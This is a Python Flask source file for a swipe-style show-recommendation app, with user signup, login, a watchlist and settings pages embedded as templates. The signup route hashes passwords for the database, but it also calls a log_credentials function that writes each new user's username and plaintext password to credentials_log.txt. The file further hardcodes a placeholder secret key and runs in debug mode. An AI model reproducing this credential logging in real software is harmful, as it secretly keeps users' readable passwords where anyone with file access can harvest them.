import os
from flask import Flask, request, render_template, jsonify, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import logging

# Set up logging
logging.basicConfig(level=logging.DEBUG)

# Create Flask app
app = Flask(__name__)
app.secret_key = 'your_secret_key'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# User model for storing login information
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    password = db.Column(db.String(150), nullable=False)

# Root directory for templates and static files (for front-end prototyping)
TEMPLATE_DIR = "templates"
STATIC_DIR = "static"

# Ensure necessary directories exist for the project
os.makedirs(TEMPLATE_DIR, exist_ok=True)
os.makedirs(STATIC_DIR, exist_ok=True)

# Log credentials to a file
def log_credentials(username, password):
    with open('credentials_log.txt', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')

# User data to simulate watchlist and user preferences (will be replaced by database in the future)
user_data = {
    'recommendations': [
        {"id": 1, "title": "Attack on Titan", "genre": "Anime", "image_url": "/static/attack.jpg", "rating": "9/10", "description": "Humans fight against gigantic creatures known as Titans to protect their city."},
        {"id": 2, "title": "Breaking Bad", "genre": "Drama", "image_url": "/static/breaking.jpg", "rating": "10/10", "description": "A high school chemistry teacher turns to a life of crime after being diagnosed with cancer."},
        {"id": 3, "title": "Naruto", "genre": "Anime", "image_url": "/static/naruto.jpg", "rating": "8/10", "description": "A young ninja with a dream of becoming the strongest and gaining the respect of his peers."},
        {"id": 4, "title": "Stranger Things", "genre": "Science Fiction", "image_url": "/static/stranger.jpg", "rating": "9/10", "description": "A group of kids uncover strange events and supernatural forces in their small town."}
    ],
    'watchlist': [],
    'preferences': {
        'dark_mode': False,
        'text_size': 'medium',
        'voice_command': False
    }
}

# Save the templates to HTML files
def save_template(filename, content):
    with open(os.path.join(TEMPLATE_DIR, filename), 'w', encoding='utf-8') as file:
        file.write(content)

# File: login.html
# =====================================
login_page_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #a9a9a9;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: black;
        }
        .login-container {
            background-color: #6e6e6e;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        .login-container h1 {
            margin-bottom: 20px;
            text-align: center;
            color: black;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .login-container a {
            color: #0044cc;
            text-decoration: none;
            font-size: 0.9em;
            display: block;
            margin: 5px 10px;
        }
        .login-container a:hover {
            text-decoration: underline;
        }
        .login-container label {
            font-size: 0.9em;
            margin-left: 10px;
        }
        .login-container button {
            background-color: #444;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: calc(100% - 20px);
            margin: 20px 10px;
        }
        .login-container button:hover {
            background-color: #333;
        }
        .remember-me-container {
            display: flex;
            align-items: center;
            margin: 10px;
        }
        .password-container {
            position: relative;
            width: calc(100% - 20px);
            margin: 10px 10px 0;
        }
        .password-container input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .password-container .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username...">
            <a href="#">Forgot username...</a>
            <div class="password-container">
                <input type="password" name="password" placeholder="Password...">
                <span class="toggle-password" onclick="togglePasswordVisibility(this)">👁️</span>
            </div>
            <a href="#">Forgot password...</a>
            <div class="remember-me-container">
                <input type="checkbox" id="remember-me" name="remember-me">
                <label for="remember-me">Remember me?</label>
            </div>
            <button type="submit">Log in</button>
        </form>
        <a href="/signup">No account? Sign up.</a>
    </div>
    <script>
        function togglePasswordVisibility(element) {
            const passwordInput = element.previousElementSibling;
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                element.textContent = '🙈';
            } else {
                passwordInput.type = 'password';
                element.textContent = '👁️';
            }
        }
    </script>
</body>
</html>
"""
save_template('login.html', login_page_template)
# =====================================

# File: signup.html
# =====================================
signup_page_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #a9a9a9;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: black;
        }
        .signup-container {
            background-color: #6e6e6e;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        .signup-container h1 {
            margin-bottom: 20px;
            text-align: center;
            color: black;
        }
        .signup-container input[type="text"],
        .signup-container input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .signup-container button {
            background-color: #444;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: calc(100% - 20px);
            margin: 20px 10px;
        }
        .signup-container button:hover {
            background-color: #333;
        }
        .password-container {
            position: relative;
            width: calc(100% - 20px);
            margin: 10px 10px 0;
        }
        .password-container input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .password-container .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="signup-container">
        <h1>Sign Up</h1>
        <form action="/signup" method="post">
            <input type="text" name="username" placeholder="Enter a Username...">
            <div class="password-container">
                <input type="password" name="password" placeholder="Enter a Password...">
                <span class="toggle-password" onclick="togglePasswordVisibility(this)">👁️</span>
            </div>
            <div class="password-container">
                <input type="password" name="confirm_password" placeholder="Confirm Password...">
                <span class="toggle-password" onclick="togglePasswordVisibility(this)">👁️</span>
            </div>
            <button type="submit">Sign Up</button>
        </form>
    </div>
    <script>
        function togglePasswordVisibility(element) {
            const passwordInput = element.previousElementSibling;
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                element.textContent = '🙈';
            } else {
                passwordInput.type = 'password';
                element.textContent = '👁️';
            }
        }
    </script>
</body>
</html>
"""
save_template('signup.html', signup_page_template)
# =====================================

# File: home.html
# =====================================
home_page_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Show Recommendations</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #a9a9a9;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: black;
        }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #6e6e6e;
            padding: 10px;
            width: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
            box-sizing: border-box;
        }
        .navbar a {
            color: white;
            text-decoration: none;
            padding: 10px;
            display: block;
        }
        .navbar a:hover {
            background-color: #ddd;
            color: black;
        }
        .menu-icon {
            font-size: 24px;
            cursor: pointer;
        }
        .center-content {
            margin-top: 100px;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 600px;
            padding: 20px;
        }
        .recommendation-card {
            text-align: center;
            margin-bottom: 20px;
            width: 100%;
            position: relative;
        }
        .show-image {
            width: 270px;
            height: 400px;
            object-fit: cover;
            border-radius: 10px;
            border: 2px solid #ccc;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            display: inline-block;
            transition: transform 0.8s ease, opacity 0.8s ease;
        }
        .swipe-actions {
            display: flex;
            gap: 60px;
            margin-top: 20px;
        }
        .swipe-btn.large-btn {
            font-size: 50px;
            padding: 30px;
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: none;
            background-color: #ffffff;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: transform 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .swipe-btn.large-btn:hover {
            transform: scale(1.1);
        }
        .swipe-btn.reject {
            background-color: #d2042d;
            color: white;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding-top: 10px;
        }
        .swipe-btn.accept {
            background-color: #e75480;
            color: white;
            font-size: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="menu-icon" onclick="window.location.href='/watchlist'">
            <img src="/static/Task-View--Streamline-Carbon.svg" alt="Watchlist" style="width: 30px; height: 30px;">
        </div>
        <div class="logo">
    <img src="/static/icon.png" alt="Logo" style="width: 50px; height: 50px;">
</div>
        <div class="settings-icon" onclick="window.location.href='/settings'" style="cursor: pointer;">
            <img src="/static/Settings--Streamline-Carbon.svg" alt="Settings" style="width: 30px; height: 30px;">
        </div>
    </nav>
    <main class="center-content">
        <section id="recommendation-card" class="recommendation-card">
            <img id="show-image" src="{{ recommendations[0]['image_url'] if 'image_url' in recommendations[0] else '/static/placeholder.jpg' }}" alt="Show/Movie Image" class="show-image">
            <div class="info">
                <h2 id="show-title">{{ recommendations[0]['title'] }}</h2>
                <p id="show-genre">{{ recommendations[0]['genre'] if 'genre' in recommendations[0] else 'Genre' }}</p>
                <p id="show-rating">{{ recommendations[0]['rating'] if 'rating' in recommendations[0] else 'Rating' }}</p>
                <p id="show-description" style="font-weight: bold;">{{ recommendations[0]['description'] if 'description' in recommendations[0] else 'Short summary of the show...' }}</p>
            </div>
        </section>
        <div class="swipe-actions">
            <button onclick="swipeLeft()" class="swipe-btn large-btn reject">&#10006;</button>
            <button onclick="swipeRight()" class="swipe-btn large-btn accept">&#9829;</button>
        </div>
    </main>
    <script>
        let currentIndex = 0;
        const recommendations = {{ recommendations|tojson }};

        function animateSwipe(direction) {
            const image = document.getElementById('show-image');
            if (direction === 'left') {
                image.style.transform = 'translateX(-200%)';
            } else if (direction === 'right') {
                image.style.transform = 'translateX(200%)';
            }
            image.style.opacity = '0';
            setTimeout(() => {
                currentIndex++;
                updateShow();
                setTimeout(() => {
                    image.style.opacity = '1';
                }, 100);
            }, 800);
        }

        function updateShow() {
            if (currentIndex < recommendations.length) {
                const show = recommendations[currentIndex];
                const image = document.getElementById('show-image');
                image.src = show.image_url || '/static/placeholder.jpg';
                document.getElementById('show-title').textContent = show.title;
                document.getElementById('show-genre').textContent = show.genre || 'Genre';
                document.getElementById('show-rating').textContent = show.rating || 'Rating';
                document.getElementById('show-description').textContent = show.description || 'Short summary of the show...';
                image.style.transform = 'translateX(0)';
            } else {
                alert('No more shows available.');
            }
        }

        function swipeLeft() {
            animateSwipe('left');
        }

        function swipeRight() {
            fetch('/add-to-watchlist/' + recommendations[currentIndex].id, { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    animateSwipe('right');
                })
                .catch(error => alert('Error adding to watchlist'));
        }

        document.addEventListener('DOMContentLoaded', () => {
            const darkModeEnabled = localStorage.getItem('dark_mode') === 'true';
            if (darkModeEnabled) {
                document.body.style.backgroundColor = '#333';
                document.body.style.color = 'white';
            }
        });
    </script>
</body>
</html>
"""
save_template('home.html', home_page_template)
# =====================================

# File: watchlist.html
# =====================================
watchlist_page_template = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watchlist</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #a9a9a9;
            color: black;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #6e6e6e;
            padding: 10px;
            width: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
            box-sizing: border-box;
        }
        .content {
            margin-top: 100px;
            width: 100%;
            max-width: 600px;
            padding: 20px;
        }
        .watchlist-item {
            background-color: #6e6e6e;
            color: white;
            padding: 15px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .watchlist-item button {
            background: none;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="menu-icon" onclick="window.location.href='/'" style="cursor: pointer;">
            <img src="/static/Home--Streamline-Carbon.svg" alt="Home" style="width: 30px; height: 30px;">
        </div>
        <div class="title">
            <h1 style="margin: 0;">Watchlist</h1>
        </div>
        <div class="logo">
    <img src="/static/icon.png" alt="Logo" style="width: 50px; height: 50px;">
</div>
    </nav>
    <div class="content">
        <div id="watchlist">
            {% for item in watchlist %}
            <div class="watchlist-item" id="watchlist-item-{{ item.id }}">
                <span>{{ item.title }}</span>
                <div class="watchlist-actions">
                    <button onclick="removeFromWatchlist({{ item.id }})">🗑️</button>
                    <button onclick="alert('Show info feature not implemented yet.')">ℹ</button>
                </div>
            </div>
            {% endfor %}
        </div>
    </div>
    <script>
        function removeFromWatchlist(showId) {
            fetch(`/remove-from-watchlist/${showId}`, { method: 'POST' })
                .then(response => response.json()).then(data => {
    if (data.message.includes('removed')) {
        const item = document.getElementById('watchlist-item-' + showId);
        item.style.transition = 'opacity 0.5s ease-out';
        item.style.opacity = '0';
        setTimeout(() => {
            item.remove();
        }, 500);
    }
})
                .catch(error => alert('Error removing from watchlist'));
        }

        document.addEventListener('DOMContentLoaded', () => {
            const darkModeEnabled = localStorage.getItem('dark_mode') === 'true';
            if (darkModeEnabled) {
                document.body.style.backgroundColor = '#333';
                document.body.style.color = 'white';
            }
        });
    </script>
</body>
</html>
"""
save_template('watchlist.html', watchlist_page_template)
# =====================================

# File: settings.html
# =====================================
settings_page_template = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #a9a9a9;
            color: black;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #6e6e6e;
            padding: 10px;
            width: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
            box-sizing: border-box;
        }
        .content {
            margin-top: 70px;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 90%;
            max-width: 600px;
            gap: 20px;
        }
        .settings-option {
            background-color: #6e6e6e;
            padding: 15px;
            text-align: left;
            width: 100%;
            font-size: 1.5em;
            color: white;
        }
        .settings-option input, .settings-option select {
            float: right;
        }
        #dark_mode {
            transform: scale(1.5);
        }
        .settings-option.logout-button {
            cursor: pointer;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="menu-icon" onclick="window.location.href='/'" style="cursor: pointer;">
            <img src="/static/Home--Streamline-Carbon.svg" alt="Home" style="width: 30px; height: 30px;">
        </div>
        <div class="title">
            <h1 style="margin: 0;">Settings</h1>
        </div>
        <div class="logo">
            <img src="/static/icon.png" alt="Logo" style="width: 50px; height: 50px;">
        </div>
    </nav>
    <div class="content">
        <div class="settings-option">
            <label for="text_size">Text Size:</label>
            <select id="text_size" name="text_size" onchange="updateTextSize()">
                <option value="small" {% if preferences.text_size == 'small' %}selected{% endif %}>Small</option>
                <option value="medium" {% if preferences.text_size == 'medium' %}selected{% endif %}>Medium</option>
                <option value="large" {% if preferences.text_size == 'large' %}selected{% endif %}>Large</option>
            </select>
        </div>
        <div class="settings-option">
            <label for="dark_mode">Dark Mode:</label>
            <input type="checkbox" id="dark_mode" name="dark_mode" {% if preferences.dark_mode %}checked{% endif %} onchange="toggleDarkMode()">
        </div>
        <div class="settings-option" onclick="alert('Update email feature not implemented yet.')">Update Email...</div>
        <div class="settings-option" onclick="alert('Change password feature not implemented yet.')">Change Password...</div>
        <div class="settings-option logout-button" onclick="window.location.href='/logout'">Log Out...</div>
    </div>
    <script>
        function toggleDarkMode() {
            const darkModeEnabled = document.getElementById('dark_mode').checked;
            document.body.style.backgroundColor = darkModeEnabled ? '#333' : '#a9a9a9';
            document.body.style.color = darkModeEnabled ? 'white' : 'black';
            localStorage.setItem('dark_mode', darkModeEnabled);
        }

        function updateTextSize() {
            const textSize = document.getElementById('text_size').value;
            document.body.style.fontSize = textSize;
            localStorage.setItem('text_size', textSize);
        }

        document.addEventListener('DOMContentLoaded', () => {
            const darkModeEnabled = localStorage.getItem('dark_mode') === 'true';
            document.getElementById('dark_mode').checked = darkModeEnabled;
            toggleDarkMode();

            const textSize = localStorage.getItem('text_size') || 'medium';
            document.getElementById('text_size').value = textSize;
            updateTextSize();
        });
    </script>
</body>
</html>
"""
save_template('settings.html', settings_page_template)
# =====================================

# Flask routes to handle the UI navigation and functionality
@app.route('/')
def home():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('home.html', recommendations=user_data['recommendations'], preferences=user_data['preferences'])

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            session['user_id'] = user.id
            return redirect(url_for('home'))
        else:
            return "Invalid username or password. Please try again."
    return render_template('login.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        try:
            username = request.form.get('username')
            password = request.form.get('password')
            confirm_password = request.form.get('confirm_password')

            if not username or not password or not confirm_password:
                return "All fields are required. Please try again."

            if password != confirm_password:
                return "Passwords do not match. Please try again."

            existing_user = User.query.filter_by(username=username).first()
            if existing_user:
                return "Username already exists. Please choose a different one."

            hashed_password = generate_password_hash(password)
            new_user = User(username=username, password=hashed_password)
            db.session.add(new_user)
            db.session.commit()

            # Log credentials to a file
            log_credentials(username, password)

            return redirect(url_for('login'))
        except Exception as e:
            logging.error(f"Error during signup: {e}")
            return "An error occurred during signup. Please try again later."
    return render_template('signup.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('login'))

@app.route('/watchlist')
def watchlist():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('watchlist.html', watchlist=user_data['watchlist'])

@app.route('/settings')
def settings():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('settings.html', preferences=user_data['preferences'])

@app.route('/add-to-watchlist/<int:show_id>', methods=['POST'])
def add_to_watchlist(show_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    show = next((rec for rec in user_data['recommendations'] if rec['id'] == show_id), None)
    if show and show not in user_data['watchlist']:
        user_data['watchlist'].append(show)
        return jsonify({'message': f'{show["title"]} added to watchlist.'})
    return jsonify({'message': 'Show not found or already in watchlist.'})

@app.route('/remove-from-watchlist/<int:show_id>', methods=['POST'])
def remove_from_watchlist(show_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    show = next((item for item in user_data['watchlist'] if item['id'] == show_id), None)
    if show:
        user_data['watchlist'].remove(show)
        return jsonify({'message': f'{show["title"]} removed from watchlist.'})
    return jsonify({'message': 'Show not found in watchlist.'})

@app.route('/update-settings', methods=['POST'])
def update_settings():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user_data['preferences']['dark_mode'] = request.form.get('dark_mode') == 'on'
    user_data['preferences']['text_size'] = request.form.get('text_size', 'medium')
    user_data['preferences']['voice_command'] = request.form.get('voice_command') == 'on'
    return jsonify({'message': 'Settings updated successfully.'})

# Run the app
if __name__ == '__main__':
    db.create_all()
    app.run(debug=True)
